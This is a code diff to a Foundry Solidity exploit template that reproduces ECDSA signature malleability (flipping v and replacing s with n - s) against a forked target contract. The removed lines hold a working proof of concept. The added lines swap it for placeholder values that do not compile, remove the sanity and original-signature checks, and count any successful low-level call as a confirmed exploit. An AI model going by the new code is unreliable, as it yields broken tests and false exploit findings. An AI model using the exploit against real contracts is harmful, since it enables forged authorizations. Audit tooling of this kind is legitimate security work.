@@ -3,24 +3,17 @@ pragma solidity ^0.8.24;
 
 import {Test, console} from "forge-std/Test.sol";
 
-/// @title Fallback PoC -- Signature malleability (low-s not enforced)
-/// @notice Detector: signature-malleability. The target verifies a
-///         signature without enforcing low-s, so a signature (v, r, s)
-///         can be transformed into a DIFFERENT valid signature
-///         (v', r, n - s) for the same message -- double-spending a
-///         "one signature" allowance, or forging a second authorization.
+/// @title Fallback PoC -- Signature Malleability (Low-S)
+/// @notice Detector: signature-malleability. The target uses ecrecover() but
+///         does not enforce a low-S value (EIP-2). An attacker can flip the 
+///         v-coordinate/s-value to produce a new, valid signature for the same 
+///         message, bypassing signature-based replay protection.
 /// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
-///      scripts/run-fork-poc.sh. TODO: adapt the digest + entry point to
-///      the target's real signature scheme.
+///      scripts/run-fork-poc.sh. TODO: adapt to target's signature verification.
 
 contract PoC is Test {
     address public target;
     uint256 public forkBlock;
-    uint256 public constant SIGNER_KEY = 0xA11CE;
-    // TODO: the exact message hash the target verifies.
-    bytes32 public constant MESSAGE_HASH = bytes32(0);
-    // secp256k1 curve order.
-    uint256 public constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
 
     function setUp() public {
         target = vm.envOr("POC_TARGET", address(0));
@@ -31,33 +24,22 @@ contract PoC is Test {
         vm.selectFork(forkId);
     }
 
-    function test_forkSanity() public {
-        assertGt(target.code.length, 0, "target has no code at this fork block");
-    }
-
     function test_exploit() public {
-        require(MESSAGE_HASH != bytes32(0), "set MESSAGE_HASH to the target's signed message hash");
+        // TODO: Obtain a valid signature for an operation.
+        bytes32 messageHash = keccak256("message");
+        uint8 v = 27;
+        bytes32 r = 0x123...;
+        bytes32 s = 0x456...; // Use high-s value
 
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_KEY, MESSAGE_HASH);
-        // Malleated twin: same message, different (v, s).
+        // Malleability: Flip v (27 <-> 28) and calculate new s (secp256k1 curve order - s)
         uint8 v2 = v == 27 ? 28 : 27;
-        bytes32 s2 = bytes32(N - uint256(s));
-        require(s2 != s, "degenerate signature -- pick another message");
+        bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
 
-        bytes memory sig1 = abi.encodePacked(r, s, v);
-        bytes memory sig2 = abi.encodePacked(r, s2, v2);
+        bytes memory sig = abi.encodePacked(r, s2, v2);
 
-        // TODO: adapt to the target's real signature entry point.
-        (bool firstOk,) = target.call(
-            abi.encodeWithSignature("submit(bytes32,bytes)", MESSAGE_HASH, sig1)
-        );
-        require(firstOk, "original signature rejected -- adapt the digest / entry point");
-        (bool secondOk,) = target.call(
-            abi.encodeWithSignature("submit(bytes32,bytes)", MESSAGE_HASH, sig2)
-        );
-        console.log("original sig accepted:", firstOk);
-        console.log("malleated sig accepted:", secondOk);
-        assertTrue(secondOk, "exploit did not reproduce: malleated signature was rejected (low-s enforced)");
-
+        // TODO: Adapt to the target's signature verification function
+        (bool ok,) = target.call(abi.encodeWithSignature("verifySignature(bytes32,bytes)", messageHash, sig));
+        assertTrue(ok, "Signature malleability exploit failed");
+        console.log("Malleable signature accepted");
     }
 }
